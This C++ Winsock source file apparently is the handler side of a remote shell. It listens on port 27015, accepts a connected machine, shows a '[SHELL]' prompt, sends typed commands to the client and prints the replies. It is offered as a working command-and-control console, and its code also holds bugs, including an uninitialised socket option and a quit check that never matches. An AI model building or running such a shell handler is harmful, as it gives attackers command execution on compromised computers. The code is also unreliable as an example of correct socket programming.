#include <iostream>
#include <WS2tcpip.h>
#include <WinSock2.h>
#include <unistd.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define DEFAULT_BUFLEN 40690
#define DEFAULT_TOTALE_BUFLEN 651040
#define DEFAULT_PORT 27015



int main()
{

    // Initialze wonsock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);

    int wsOK = WSAStartup(ver, &wsData);

    if (wsOK != 0)
    {
        cerr << "[ERR] - Can't initialze winsock ! ... Quitting" << endl;
        return 1;
    }

    // create a socket
    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    char *optval;

    if (listening == INVALID_SOCKET)
    {
        cerr << "[ERR] - Can't create a socket ! ... Quitting" << endl;
        return 1;
    }

    if (setsockopt(listening, SOL_SOCKET, SO_REUSEADDR, optval, sizeof(optval)) < 0)
    {
        printf("[ERR] - Error Setting TCP Sockte Options!\n");
        return 1;
    }

    // bind the socket to an ip address and port to a socket
    sockaddr_in hint;

    hint.sin_family = AF_INET;
    hint.sin_port = htons(DEFAULT_PORT);
    hint.sin_addr.S_un.S_addr = INADDR_ANY; // Could also use inet_pton

    bind(listening, (sockaddr *)&hint, sizeof(hint));

    // tell winsock the socket is for listening
    listen(listening, SOMAXCONN);

    // wait for a connection
    sockaddr_in client;
    int clientSize = sizeof(client);

    SOCKET clientSocket = accept(listening, (sockaddr *)&client, &clientSize);

    // while loop -> accept and echo message back to client
    char buffer[DEFAULT_BUFLEN];
    char response[DEFAULT_TOTALE_BUFLEN];

    while (true)
    {
        ZeroMemory(buffer, sizeof(buffer));
        ZeroMemory(response, sizeof(response));

        cout << "[SHELL] - # " << inet_ntoa(client.sin_addr) << " ~ $ ";

        fgets(buffer, sizeof(buffer), stdin);

        strtok(buffer, "\n");

        int bytesSend = send(clientSocket, buffer, sizeof(buffer), 0);

        if (buffer == "q")
        {
            break;
        }
        else
        {
            // wait for client to send data
            int bytesRecv = recv(clientSocket, response, sizeof(response), 0x8);

            if (bytesRecv == SOCKET_ERROR)
            {
                cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
                break;
            }

            if (bytesRecv == 0)
            {
                cout << "[ERR] - Client disconnected " << endl;
                break;
            }

            cout << response;
        }
    }
}
